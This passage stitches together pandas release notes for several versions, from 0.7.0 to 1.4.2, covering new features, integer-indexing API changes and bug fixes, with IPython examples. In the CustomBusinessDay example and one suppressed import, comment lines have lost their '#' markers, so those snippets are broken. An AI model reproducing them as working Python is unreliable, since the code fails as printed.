\"b\": [1, 2, 3, 4]})\n        df.replace(regex=r\"\\s*\\.\\s*\", value=np.nan)\n\n    to replace all occurrences of the string ``'.'`` with zero or more\n    instances of surrounding white space with ``NaN``.\n\n    Regular string replacement still works as expected. For example, you can do\n\n    .. ipython:: python\n\n        df.replace(\".\", np.nan)\n\n    to replace all occurrences of the string ``'.'`` with ``NaN``.\n\n  - ``pd.melt()`` now accepts the optional parameters ``var_name`` and ``value_name``\n    to specify custom column names of the returned DataFrame.\n\n  - ``pd.set_option()`` now allows N option, value pairs (:issue:`3667`).\n\n    Let's say that we had an option ``'a.b'`` and another option ``'b.c'``.\n    We can set them at the same time:\n\n    .. code-block:: ipython\n\n        In [31]: pd.get_option('a.b')\n        Out[31]: 2\n\n        In [32]: pd.get_option('b.c')\n        Out[32]: 3\n\n        In [33]: pd.set_option('a.b', 1, 'b.c', 4)\n\n        In [34]: pd.get_option('a.b')\n        Out[34]: 1\n\n        In [35]: pd.get_option('b.c')\n        Out[35]: 4\n\n  - The ``filter`` method for group objects returns a subset of the original\n    object. Suppose we want to take only elements that belong to groups with a\n    group sum greater than 2.\n\n    .. ipython:: python\n\n       sf = pd.Series([1, 1, 2, 3, 3, 3])\n       sf.groupby(sf).filter(lambda x: x.sum() > 2)\n\n    The argument of ``filter`` must a function that, applied to the group as a\n    whole, returns ``True`` or ``False``.\n\n    Another useful operation is filtering out elements that belong to groups\n    with only a couple members.\n\n    .. ipython:: python\n\n       dff = pd.DataFrame({\"A\": np.arange(8), \"B\": list(\"aabbbbcc\")})\n       dff.groupby(\"B\").filter(lambda x: len(x) > 2)\n\n    Alternatively, instead of dropping the offending groups, we can return a\n    like-indexed objects where the groups that do not pass the filter are\n    filled with NaNs.\n\n    .. ipython:: python\n\n       dff.groupby(\"B\").filter(lambda x: len(x) > 2, dropna=False)\n\n  - Series and DataFrame hist methods now take a ``figsize`` argument (:issue:`3834`)\n\n  - DatetimeIndexes no longer try to convert mixed-integer indexes during join\n    operations (:issue:`3877`)\n\n  - Timestamp.min and Timestamp.max now represent valid Timestamp instances instead\n    of the default datetime.min and datetime.max (respectively), thanks SleepingPills\n\n  - ``read_html`` now raises when no tables are found and BeautifulSoup==4.2.0\n    is detected (:issue:`4214`)\n\n\nExperimental features\n~~~~~~~~~~~~~~~~~~~~~\n\n  - Added experimental ``CustomBusinessDay`` class to support ``DateOffsets``\n    with custom holiday calendars and custom weekmasks. (:issue:`2301`)\n\n    .. note::\n\n       This uses the ``numpy.busdaycalendar`` API introduced in Numpy 1.7 and\n       therefore requires Numpy 1.7.0 or newer.\n\n    .. ipython:: python\n\n      from pandas.tseries.offsets import CustomBusinessDay\n      from datetime import datetime\n\n       As an interesting example, let's look at Egypt where\n       a Friday-Saturday weekend is observed.\n      weekmask_egypt = \"Sun Mon Tue Wed Thu\"\n       They also observe International Workers' Day so let's\n       add that for a couple of years\n      holidays = [\"2012-05-01\", datetime(2013, 5, 1), np.datetime64(\"2014-05-01\")]\n      bday_egypt = CustomBusinessDay(holidays=holidays, weekmask=weekmask_egypt)\n      dt = datetime(2013, 4, 30)\n      print(dt + 2 * bday_egypt)\n      dts = pd.date_range(dt, periods=5, freq=bday_egypt)\n      print(pd.Series(dts.weekday, dts).map(pd.Series(\"Mon Tue Wed Thu Fri Sat Sun\".split())))\n\nBug fixes\n~~~~~~~~~\n\n  - Plotting functions now raise a ``TypeError`` before trying to plot anything\n    if the associated objects have a dtype of ``object`` (:issue:`1818`,\n    :issue:`3572`, :issue:`3911`, :issue:`3912`), but they will try to convert object arrays to\n    numeric arrays if possible so that you can still plot, for example, an\n    object array with floats. This happens before any drawing takes place which\n    eliminates any spurious plots from showing up.\n\n  - ``fillna`` methods now raise a ``TypeError`` if the ``value`` parameter is\n    a list or tuple.\n\n  - ``Series.str`` now supports iteration (:issue:`3638`). You can iterate over the\n    individual elements of each string in the ``Series``. Each iteration yields\n    a ``Series`` with either a single character at each index of the original\n    ``Series`` or ``NaN``. For example,\n\n    .. code-block:: ipython\n\n        In [38]: strs = \"go\", \"bow\", \"joe\", \"slow\"\n\n        In [32]: ds = pd.Series(strs)\n\n        In [33]: for s in ds.str:\n            ...:     print(s)\n\n        0    g\n        1    b\n        2    j\n        3    s\n        dtype: object\n        0    o\n        1    o\n        2    o\n        3    l\n        dtype: object\n        0    NaN\n        1      w\n        2      e\n        3      o\n        dtype: object\n        0    NaN\n        1    NaN\n        2    NaN\n        3      w\n        dtype: object\n\n        In [41]: s\n        Out[41]:\n        0    NaN\n        1    NaN\n        2    NaN\n        3      w\n        dtype: object\n\n        In [42]: s.dropna().values.item() == \"w\"\n        Out[42]: True\n\n    The last element yielded by the iterator will be a ``Series`` containing\n    the last element of the longest string in the ``Series`` with all other\n    elements being ``NaN``. Here since ``'slow'`` is the longest string\n    and there are no other strings with the same length ``'w'`` is the only\n    non-null string in the yielded ``Series``.\n\n  - ``HDFStore``\n\n    - will retain index attributes (freq,tz,name) on recreation (:issue:`3499`)\n    - will warn with a ``AttributeConflictWarning`` if you are attempting to append\n      an index with a different frequency than the existing, or attempting\n      to append an index with a different name than the existing\n    - support datelike columns with a timezone as data_columns (:issue:`2852`)\n\n  - Non-unique index support clarified (:issue:`3468`).\n\n    - Fix assigning a new index to a duplicate index in a DataFrame would fail (:issue:`3468`)\n    - Fix construction of a DataFrame with a duplicate index\n    - ref_locs support to allow duplicative indices across dtypes,\n      allows iget support to always find the index (even across dtypes) (:issue:`2194`)\n    - applymap on a DataFrame with a non-unique index now works\n      (removed warning) (:issue:`2786`), and fix (:issue:`3230`)\n    - Fix to_csv to handle non-unique columns (:issue:`3495`)\n    - Duplicate indexes with getitem will return items in the correct order (:issue:`3455`, :issue:`3457`)\n      and handle missing elements like unique indices (:issue:`3561`)\n    - Duplicate indexes with and empty DataFrame.from_records will return a correct frame (:issue:`3562`)\n    - Concat to produce a non-unique columns when duplicates are across dtypes is fixed (:issue:`3602`)\n    - Allow insert/delete to non-unique columns (:issue:`3679`)\n    - Non-unique indexing with a slice via ``loc`` and friends fixed (:issue:`3659`)\n    - Allow insert/delete to non-unique columns (:issue:`3679`)\n    - Extend ``reindex`` to correctly deal with non-unique indices (:issue:`3679`)\n    - ``DataFrame.itertuples()`` now works with frames with duplicate column\n      names (:issue:`3873`)\n    - Bug in non-unique indexing via ``iloc`` (:issue:`4017`); added ``takeable`` argument to\n      ``reindex`` for location-based taking\n    - Allow non-unique indexing in series via ``.ix/.loc`` and ``__getitem__`` (:issue:`4246`)\n    - Fixed non-unique indexing memory allocation issue with ``.ix/.loc`` (:issue:`4280`)\n\n  - ``DataFrame.from_records`` did not accept empty recarrays (:issue:`3682`)\n  - ``read_html`` now correctly skips tests (:issue:`3741`)\n  - Fixed a bug where ``DataFrame.replace`` with a compiled regular expression\n    in the ``to_replace`` argument wasn't working (:issue:`3907`)\n  - Improved ``network`` test decorator to catch ``IOError`` (and therefore\n    ``URLError`` as well). Added ``with_connectivity_check`` decorator to allow\n    explicitly checking a website as a proxy for seeing if there is network\n    connectivity. Plus, new ``optional_args`` decorator factory for decorators.\n    (:issue:`3910`, :issue:`3914`)\n  - Fixed testing issue where too many sockets where open thus leading to a\n    connection reset issue (:issue:`3982`, :issue:`3985`, :issue:`4028`,\n    :issue:`4054`)\n  - Fixed failing tests in test_yahoo, test_google where symbols were not\n    retrieved but were being accessed (:issue:`3982`, :issue:`3985`,\n    :issue:`4028`, :issue:`4054`)\n  - ``Series.hist`` will now take the figure from the current environment if\n    one is not passed\n  - Fixed bug where a 1xN DataFrame would barf on a 1xN mask (:issue:`4071`)\n  - Fixed running of ``tox`` under python3 where the pickle import was getting\n    rewritten in an incompatible way (:issue:`4062`, :issue:`4063`)\n  - Fixed bug where sharex and sharey were not being passed to grouped_hist\n    (:issue:`4089`)\n  - Fixed bug in ``DataFrame.replace`` where a nested dict wasn't being\n    iterated over when regex=False (:issue:`4115`)\n  - Fixed bug in the parsing of microseconds when using the ``format``\n    argument in ``to_datetime`` (:issue:`4152`)\n  - Fixed bug in ``PandasAutoDateLocator`` where ``invert_xaxis`` triggered\n    incorrectly ``MilliSecondLocator``  (:issue:`3990`)\n  - Fixed bug in plotting that wasn't raising on invalid colormap for\n    matplotlib 1.1.1 (:issue:`4215`)\n  - Fixed the legend displaying in ``DataFrame.plot(kind='kde')`` (:issue:`4216`)\n  - Fixed bug where Index slices weren't carrying the name attribute\n    (:issue:`4226`)\n  - Fixed bug in initializing ``DatetimeIndex`` with an array of strings\n    in a certain time zone (:issue:`4229`)\n  - Fixed bug where html5lib wasn't being properly skipped (:issue:`4265`)\n  - Fixed bug where get_data_famafrench wasn't using the correct file edges\n    (:issue:`4281`)\n\nSee the :ref:`full release notes\n<release>` or issue tracker\non GitHub for a complete list.\n\n\n.. _whatsnew_0.12.0.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.11.0..v0.12.0\n\n\n.. _whatsnew_142:\n\nWhat's new in 1.4.2 (April 2, 2022)\n-----------------------------------\n\nThese are the changes in pandas 1.4.2. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_142.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in :meth:`DataFrame.drop` and :meth:`Series.drop` when :class:`Index` had extension dtype and duplicates (:issue:`45860`)\n- Fixed regression in :func:`read_csv` killing python process when invalid file input was given for ``engine=\"c\"`` (:issue:`45957`)\n- Fixed memory performance regression in :meth:`Series.fillna` when called on a :class:`DataFrame` column with ``inplace=True`` (:issue:`46149`)\n- Provided an alternative solution for passing custom Excel formats in :meth:`.Styler.to_excel`, which was a regression based on stricter CSS validation. Examples available in the documentation for :meth:`.Styler.format` (:issue:`46152`)\n- Fixed regression in :meth:`DataFrame.replace` when a replacement value was also a target for replacement (:issue:`46306`)\n- Fixed regression in :meth:`DataFrame.replace` when the replacement value was explicitly ``None`` when passed in a dictionary to ``to_replace`` (:issue:`45601`, :issue:`45836`)\n- Fixed regression when setting values with :meth:`DataFrame.loc` losing :class:`MultiIndex` names if :class:`DataFrame`  was empty before (:issue:`46317`)\n- Fixed regression when rendering boolean datatype columns with :meth:`.Styler` (:issue:`46384`)\n- Fixed regression in :meth:`Groupby.rolling` with a frequency window that would raise a ``ValueError`` even if the datetimes within each group were monotonic (:issue:`46061`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_142.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Fix some cases for subclasses that define their ``_constructor`` properties as general callables (:issue:`46018`)\n- Fixed \"longtable\" formatting in :meth:`.Styler.to_latex` when ``column_format`` is given in extended format (:issue:`46037`)\n- Fixed incorrect rendering in :meth:`.Styler.format` with ``hyperlinks=\"html\"`` when the url contains a colon or other special characters (:issue:`46389`)\n- Improved error message in :class:`.Rolling` when ``window`` is a frequency and ``NaT`` is in the rolling axis (:issue:`46087`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_142.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.4.1..v1.4.2\n\n\n.. _whatsnew_0203:\n\nVersion 0.20.3 (July 7, 2017)\n-----------------------------\n\n{{ header }}\n\n.. ipython:: python\n   :suppress:\n\n   from pandas import *   noqa F401, F403\n\n\nThis is a minor bug-fix release in the 0.20.x series and includes some small regression fixes\nand bug fixes. We recommend that all users upgrade to this version.\n\n.. contents:: What's new in v0.20.3\n    :local:\n    :backlinks: none\n\n.. _whatsnew_0203.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n- Fixed a bug in failing to compute rolling computations of a column-MultiIndexed ``DataFrame`` (:issue:`16789`, :issue:`16825`)\n- Fixed a pytest marker failing downstream packages' tests suites (:issue:`16680`)\n\nConversion\n^^^^^^^^^^\n\n- Bug in pickle compat prior to the v0.20.x series, when ``UTC`` is a timezone in a Series/DataFrame/Index (:issue:`16608`)\n- Bug in ``Series`` construction when passing a ``Series`` with ``dtype='category'`` (:issue:`16524`).\n- Bug in :meth:`DataFrame.astype` when passing a ``Series`` as the ``dtype`` kwarg. (:issue:`16717`).\n\nIndexing\n^^^^^^^^\n\n- Bug in ``Float64Index`` causing an empty array instead of ``None`` to be returned from ``.get(np.nan)`` on a Series whose index did not contain any ``NaN`` s (:issue:`8569`)\n- Bug in ``MultiIndex.isin`` causing an error when passing an empty iterable (:issue:`16777`)\n- Fixed a bug in a slicing DataFrame/Series that have a  ``TimedeltaIndex`` (:issue:`16637`)\n\nIO\n^^\n\n- Bug in :func:`read_csv` in which files weren't opened as binary files by the C engine on Windows, causing EOF characters mid-field, which would fail (:issue:`16039`, :issue:`16559`, :issue:`16675`)\n- Bug in :func:`read_hdf` in which reading a ``Series`` saved to an HDF file in 'fixed' format fails when an explicit ``mode='r'`` argument is supplied (:issue:`16583`)\n- Bug in :meth:`DataFrame.to_latex` where ``bold_rows`` was wrongly specified to be ``True`` by default, whereas in reality row labels remained non-bold whatever parameter provided. (:issue:`16707`)\n- Fixed an issue with :meth:`DataFrame.style` where generated element ids were not unique (:issue:`16780`)\n- Fixed loading a ``DataFrame`` with a ``PeriodIndex``, from a ``format='fixed'`` HDFStore, in Python 3, that was written in Python 2 (:issue:`16781`)\n\nPlotting\n^^^^^^^^\n\n- Fixed regression that prevented RGB and RGBA tuples from being used as color arguments (:issue:`16233`)\n- Fixed an issue with :meth:`DataFrame.plot.scatter` that incorrectly raised a ``KeyError`` when categorical data is used for plotting (:issue:`16199`)\n\nReshaping\n^^^^^^^^^\n\n- ``PeriodIndex`` / ``TimedeltaIndex.join`` was missing the ``sort=`` kwarg (:issue:`16541`)\n- Bug in joining on a ``MultiIndex`` with a ``category`` dtype for a level (:issue:`16627`).\n- Bug in :func:`merge` when merging/joining with multiple categorical columns (:issue:`16767`)\n\nCategorical\n^^^^^^^^^^^\n\n- Bug in ``DataFrame.sort_values`` not respecting the ``kind`` parameter with categorical data (:issue:`16793`)\n\n\n.. _whatsnew_0.20.3.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.20.2..v0.20.3\n\n\n.. _whatsnew_0801:\n\nVersion 0.8.1 (July 22, 2012)\n-----------------------------\n\n{{ header }}\n\n\nThis release includes a few new features, performance enhancements, and over 30\nbug fixes from 0.8.0.  New features include notably NA friendly string\nprocessing functionality and a series of new plot types and options.\n\nNew features\n~~~~~~~~~~~~\n\n  - Add :ref:`vectorized string processing methods <text.string_methods>`\n    accessible via Series.str (:issue:`620`)\n  - Add option to disable adjustment in EWMA (:issue:`1584`)\n  - :ref:`Radviz plot <visualization.radviz>` (:issue:`1566`)\n  - :ref:`Parallel coordinates plot <visualization.parallel_coordinates>`\n  - :ref:`Bootstrap plot <visualization.bootstrap>`\n  - Per column styles and secondary y-axis plotting (:issue:`1559`)\n  - New datetime converters millisecond plotting  (:issue:`1599`)\n  - Add option to disable \"sparse\" display of hierarchical indexes (:issue:`1538`)\n  - Series/DataFrame's ``set_index`` method can :ref:`append levels\n    <indexing.set_index>` to an existing Index/MultiIndex (:issue:`1569`, :issue:`1577`)\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n  - Improved implementation of rolling min and max (thanks to `Bottleneck\n    <https://bottleneck.readthedocs.io>`__ !)\n  - Add accelerated ``'median'`` GroupBy option (:issue:`1358`)\n  - Significantly improve the performance of parsing ISO8601-format date\n    strings with ``DatetimeIndex`` or ``to_datetime`` (:issue:`1571`)\n  - Improve the performance of GroupBy on single-key aggregations and use with\n    Categorical types\n  - Significant datetime parsing performance improvements\n\n\n\n.. _whatsnew_0.8.1.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.8.0..v0.8.1\n\n\n.. _whatsnew_112:\n\nWhat's new in 1.1.2 (September 8, 2020)\n---------------------------------------\n\nThese are the changes in pandas 1.1.2. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_112.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Regression in :meth:`DatetimeIndex.intersection` incorrectly raising ``AssertionError`` when intersecting against a list (:issue:`35876`)\n- Fix regression in updating a column inplace (e.g. using ``df['col'].fillna(.., inplace=True)``) (:issue:`35731`)\n- Fix regression in :meth:`DataFrame.append` mixing tz-aware and tz-naive datetime columns (:issue:`35460`)\n- Performance regression for :meth:`RangeIndex.format` (:issue:`35712`)\n- Regression where :meth:`MultiIndex.get_loc` would return a slice spanning the full index when passed an empty list (:issue:`35878`)\n- Fix regression in invalid cache after an indexing operation; this can manifest when setting which does not update the data (:issue:`35521`)\n- Regression in :meth:`DataFrame.replace` where a ``TypeError`` would be raised when attempting to replace elements of type :class:`Interval` (:issue:`35931`)\n- Fix regression in pickle roundtrip of the ``closed`` attribute of :class:`IntervalIndex` (:issue:`35658`)\n- Fixed regression in :meth:`DataFrameGroupBy.agg` where a ``ValueError: buffer source array is read-only`` would be raised when the underlying array is read-only (:issue:`36014`)\n- Fixed regression in :meth:`Series.groupby.rolling` number of levels of :class:`MultiIndex` in input was compressed to one (:issue:`36018`)\n- Fixed regression in :class:`DataFrameGroupBy` on an empty :class:`DataFrame` (:issue:`36197`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_112.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in :meth:`DataFrame.eval` with ``object`` dtype column binary operations (:issue:`35794`)\n- Bug in :class:`Series` constructor raising a ``TypeError`` when constructing sparse datetime64 dtypes (:issue:`35762`)\n- Bug in :meth:`DataFrame.apply` with ``result_type=\"reduce\"`` returning with incorrect index (:issue:`35683`)\n- Bug in :meth:`Series.astype` and :meth:`DataFrame.astype` not respecting the ``errors`` argument when set to ``\"ignore\"`` for extension dtypes (:issue:`35471`)\n- Bug in :meth:`DateTimeIndex.format` and :meth:`PeriodIndex.format` with ``name=True`` setting the first item to ``\"None\"`` where it should be ``\"\"`` (:issue:`35712`)\n- Bug in :meth:`Float64Index.__contains__` incorrectly raising ``TypeError`` instead of returning ``False`` (:issue:`35788`)\n- Bug in :class:`Series` constructor incorrectly raising a ``TypeError`` when passed an ordered set (:issue:`36044`)\n- Bug in :meth:`Series.dt.isocalendar` and :meth:`DatetimeIndex.isocalendar` that returned incorrect year for certain dates (:issue:`36032`)\n- Bug in :class:`DataFrame` indexing returning an incorrect :class:`Series` in some cases when the series has been altered and a cache not invalidated (:issue:`33675`)\n- Bug in :meth:`DataFrame.corr` causing subsequent indexing lookups to be incorrect (:issue:`35882`)\n- Bug in :meth:`import_optional_dependency` returning incorrect package names in cases where package name is different from import name (:issue:`35948`)\n- Bug when setting empty :class:`DataFrame` column to a :class:`Series` in preserving name of index in frame (:issue:`31368`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_112.other:\n\nOther\n~~~~~\n- :meth:`factorize` now supports ``na_sentinel=None`` to include NaN in the uniques of the values and remove ``dropna`` keyword which was unintentionally exposed to public facing API in 1.1 version from :meth:`factorize` (:issue:`35667`)\n- :meth:`DataFrame.plot` and :meth:`Series.plot` raise ``UserWarning`` about usage of ``FixedFormatter`` and ``FixedLocator`` (:issue:`35684` and :issue:`35945`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_112.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.1.1..v1.1.2\n\n\n.. _whatsnew_0700:\n\nVersion 0.7.0 (February 9, 2012)\n--------------------------------\n\n{{ header }}\n\n\nNew features\n~~~~~~~~~~~~\n\n- New unified :ref:`merge function <merging.join>` for efficiently performing\n  full gamut of database / relational-algebra operations. Refactored existing\n  join methods to use the new infrastructure, resulting in substantial\n  performance gains (:issue:`220`, :issue:`249`, :issue:`267`)\n\n- New :ref:`unified concatenation function <merging.concat>` for concatenating\n  Series, DataFrame or Panel objects along an axis. Can form union or\n  intersection of the other axes. Improves performance of ``Series.append`` and\n  ``DataFrame.append`` (:issue:`468`, :issue:`479`, :issue:`273`)\n\n- Can pass multiple DataFrames to\n  ``DataFrame.append`` to concatenate (stack) and multiple Series to\n  ``Series.append`` too\n\n- :ref:`Can<basics.dataframe.from_list_of_dicts>` pass list of dicts (e.g., a\n  list of JSON objects) to DataFrame constructor (:issue:`526`)\n\n- You can now :ref:`set multiple columns <indexing.columns.multiple>` in a\n  DataFrame via ``__getitem__``, useful for transformation (:issue:`342`)\n\n- Handle differently-indexed output values in ``DataFrame.apply`` (:issue:`498`)\n\n.. code-block:: ipython\n\n   In [1]: df = pd.DataFrame(np.random.randn(10, 4))\n   In [2]: df.apply(lambda x: x.describe())\n   Out[2]:\n                  0          1          2          3\n   count  10.000000  10.000000  10.000000  10.000000\n   mean    0.190912  -0.395125  -0.731920  -0.403130\n   std     0.730951   0.813266   1.112016   0.961912\n   min    -0.861849  -2.104569  -1.776904  -1.469388\n   25%    -0.411391  -0.698728  -1.501401  -1.076610\n   50%     0.380863  -0.228039  -1.191943  -1.004091\n   75%     0.658444   0.057974  -0.034326   0.461706\n   max     1.212112   0.577046   1.643563   1.071804\n\n   [8 rows x 4 columns]\n\n- :ref:`Add<advanced.reorderlevels>` ``reorder_levels`` method to Series and\n  DataFrame (:issue:`534`)\n\n- :ref:`Add<indexing.dictionarylike>` dict-like ``get`` function to DataFrame\n  and Panel (:issue:`521`)\n\n- :ref:`Add<basics.iterrows>` ``DataFrame.iterrows`` method for efficiently\n  iterating through the rows of a DataFrame\n\n- Add ``DataFrame.to_panel`` with code adapted from\n  ``LongPanel.to_long``\n\n- :ref:`Add <basics.reindexing>` ``reindex_axis`` method added to DataFrame\n\n- :ref:`Add <basics.stats>` ``level`` option to binary arithmetic functions on\n  ``DataFrame`` and ``Series``\n\n- :ref:`Add <advanced.advanced_reindex>` ``level`` option to the ``reindex``\n  and ``align`` methods on Series and DataFrame for broadcasting values across\n  a level (:issue:`542`, :issue:`552`, others)\n\n- Add attribute-based item access to\n  ``Panel`` and add IPython completion (:issue:`563`)\n\n- :ref:`Add <visualization.basic>` ``logy`` option to ``Series.plot`` for\n  log-scaling on the Y axis\n\n- :ref:`Add <io.formatting>` ``index`` and ``header`` options to\n  ``DataFrame.to_string``\n\n- :ref:`Can <merging.multiple_join>` pass multiple DataFrames to\n  ``DataFrame.join`` to join on index (:issue:`115`)\n\n- :ref:`Can <merging.multiple_join>` pass multiple Panels to ``Panel.join``\n  (:issue:`115`)\n\n- :ref:`Added <io.formatting>` ``justify`` argument to ``DataFrame.to_string``\n  to allow different alignment of column headers\n\n- :ref:`Add <groupby.attributes>` ``sort`` option to GroupBy to allow disabling\n  sorting of the group keys for potential speedups (:issue:`595`)\n\n- :ref:`Can <basics.dataframe.from_series>` pass MaskedArray to Series\n  constructor (:issue:`563`)\n\n- Add Panel item access via attributes\n  and IPython completion (:issue:`554`)\n\n- Implement ``DataFrame.lookup``, fancy-indexing analogue for retrieving values\n  given a sequence of row and column labels (:issue:`338`)\n\n- Can pass a :ref:`list of functions <groupby.aggregate.multifunc>` to\n  aggregate with groupby on a DataFrame, yielding an aggregated result with\n  hierarchical columns (:issue:`166`)\n\n- Can call ``cummin`` and ``cummax`` on Series and DataFrame to get cumulative\n  minimum and maximum, respectively (:issue:`647`)\n\n- ``value_range`` added as utility function to get min and max of a dataframe\n  (:issue:`288`)\n\n- Added ``encoding`` argument to ``read_csv``, ``read_table``, ``to_csv`` and\n  ``from_csv`` for non-ascii text (:issue:`717`)\n\n- :ref:`Added <basics.stats>` ``abs`` method to pandas objects\n\n- :ref:`Added <reshaping.pivot>` ``crosstab`` function for easily computing frequency tables\n\n- :ref:`Added <indexing.set_ops>` ``isin`` method to index objects\n\n- :ref:`Added <advanced.xs>` ``level`` argument to ``xs`` method of DataFrame.\n\n\nAPI changes to integer indexing\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nOne of the potentially riskiest API changes in 0.7.0, but also one of the most\nimportant, was a complete review of how **integer indexes** are handled with\nregard to label-based indexing. Here is an example:\n\n.. code-block:: ipython\n\n    In [3]: s = pd.Series(np.random.randn(10), index=range(0, 20, 2))\n    In [4]: s\n    Out[4]:\n    0    -1.294524\n    2     0.413738\n    4     0.276662\n    6    -0.472035\n    8    -0.013960\n    10   -0.362543\n    12   -0.006154\n    14   -0.923061\n    16    0.895717\n    18    0.805244\n    Length: 10, dtype: float64\n\n    In [5]: s[0]\n    Out[5]: -1.2945235902555294\n\n    In [6]: s[2]\n    Out[6]: 0.41373810535784006\n\n    In [7]: s[4]\n    Out[7]: 0.2766617129497566\n\nThis is all exactly identical to the behavior before. However, if you ask for a\nkey **not** contained in the Series, in versions 0.6.1 and prior, Series would\n*fall back* on a location-based lookup. This now raises a ``KeyError``:\n\n.. code-block:: ipython\n\n   In [2]: s[1]\n   KeyError: 1\n\nThis change also has the same impact on DataFrame:\n\n.. code-block:: ipython\n\n   In [3]: df = pd.DataFrame(np.random.randn(8, 4), index=range(0, 16, 2))\n\n   In [4]: df\n       0        1       2       3\n   0   0.88427  0.3363 -0.1787  0.03162\n   2   0.14451 -0.1415  0.2504  0.58374\n   4  -1.44779 -0.9186 -1.4996  0.27163\n   6  -0.26598 -2.4184 -0.2658  0.11503\n   8  -0.58776  0.3144 -0.8566  0.61941\n   10  0.10940 -0.7175 -1.0108  0.47990\n   12 -1.16919 -0.3087 -0.6049 -0.43544\n   14 -0.07337  0.3410  0.0424 -0.16037\n\n   In [5]: df.ix[3]\n   KeyError: 3\n\nIn order to support purely integer-based indexing, the following methods have\nbeen added:\n\n.. csv-table::\n    :header: \"Method\",\"Description\"\n    :widths: 40,60\n\n        ``Series.iget_value(i)``, Retrieve value stored at location ``i``\n        ``Series.iget(i)``, Alias for ``iget_value``\n        ``DataFrame.irow(i)``, Retrieve the ``i``-th row\n        ``DataFrame.icol(j)``, Retrieve the ``j``-th column\n        \"``DataFrame.iget_value(i, j)``\", Retrieve the value at row ``i`` and column ``j``\n\nAPI tweaks regarding label-based slicing\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nLabel-based slicing using ``ix`` now requires that the index be sorted\n(monotonic) **unless** both the start and endpoint are contained in the index:\n\n.. code-block:: python\n\n   In [1]: s = pd.Series(np.random.randn(6), index=list('gmkaec'))\n\n   In [2]: s\n   Out[2]:\n   g   -1.182230\n   m   -0.276183\n   k   -0.243550\n   a    1.628992\n   e    0.073308\n   c   -0.539890\n   dtype: float64\n\nThen this is OK:\n\n.. code-block:: python\n\n   In [3]: s.ix['k':'e']\n   Out[3]:\n   k   -0.243550\n   a    1.628992\n   e    0.073308\n   dtype: float64\n\nBut this is not:\n\n.. code-block:: ipython\n\n   In [12]: s.ix['b':'h']\n   KeyError 'b'\n\nIf the index had been sorted, the \"range selection\" would have been possible:\n\n.. code-block:: python\n\n   In [4]: s2 = s.sort_index()\n\n   In [5]: s2\n   Out[5]:\n   a    1.628992\n   c   -0.539890\n   e    0.073308\n   g   -1.182230\n   k   -0.243550\n   m   -0.276183\n   dtype: float64\n\n   In [6]: s2.ix['b':'h']\n   Out[6]:\n   c   -0.539890\n   e    0.073308\n   g   -1.182230\n   dtype: float64\n\nChanges to Series ``[]`` operator\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nAs as notational convenience, you can pass a sequence of labels or a label\nslice to a Series when getting and setting values via ``[]`` (i.e. the\n``__getitem__`` and ``__setitem__`` methods). The behavior will be the same as\npassing similar input to ``ix`` **except in the case of integer indexing**:\n\n.. code-block:: ipython\n\n  In [8]: s = pd.Series(np.random.randn(6), index=list('acegkm'))\n\n  In [9]: s\n  Out[9]:\n  a   -1.206412\n  c    2.565646\n  e    1.431256\n  g    1.340309\n  k   -1.170299\n  m   -0.226169\n  Length: 6, dtype: float64\n\n  In [10]: s[['m', 'a', 'c', 'e']]\n  Out[10]:\n  m   -0.226169\n  a   -1.206412\n  c    2.565646\n  e    1.431256\n  Length: 4, dtype: float64\n\n  In [11]: s['b':'l']\n  Out[11]:\n  c    2.565646\n  e    1.431256\n  g    1.340309\n  k   -1.170299\n  Length: 4, dtype: float64\n\n  In [12]: s['c':'k']\n  Out[12]:\n  c    2.565646\n  e    1.431256\n  g    1.340309\n  k   -1.170299\n  Length: 4, dtype: float64\n\nIn the case of integer indexes, the behavior will be exactly as before\n(shadowing ``ndarray``):\n\n.. code-block:: ipython\n\n  In [13]: s = pd.Series(np.random.randn(6), index=range(0, 12, 2))\n\n  In [14]: s[[4, 0, 2]]\n  Out[14]:\n  4    0.132003\n  0    0.410835\n  2    0.813850\n  Length: 3, dtype: float64\n\n  In [15]: s[1:5]\n  Out[15]:\n  2    0.813850\n  4    0.132003\n  6   -0.827317\n  8   -0.076467\n  Length: 4, dtype: float64\n\nIf you wish to do indexing with sequences and slicing on an integer index with\nlabel semantics, use ``ix``.\n\nOther API changes\n~~~~~~~~~~~~~~~~~\n\n- The deprecated ``LongPanel`` class has been completely removed\n\n- If ``Series.sort`` is called on a column of a DataFrame, an exception will\n  now be raised. Before it was possible to accidentally mutate a DataFrame's\n  column by doing ``df[col].sort()`` instead of the side-effect free method\n  ``df[col].order()`` (:issue:`316`)\n\n- Miscellaneous renames and deprecations which will (harmlessly) raise\n  ``FutureWarning``\n\n- ``drop`` added as an optional parameter to ``DataFrame.reset_index`` (:issue:`699`)\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n- :ref:`Cythonized GroupBy aggregations <groupby.aggregate.builtin>` no longer\n  presort the data, thus achieving a significant speedup (:issue:`93`).  GroupBy\n  aggregations with Python functions significantly sped up by clever\n  manipulation of the ndarray data type in Cython (:issue:`496`).\n- Better error message in DataFrame constructor when passed column labels\n  don't match data 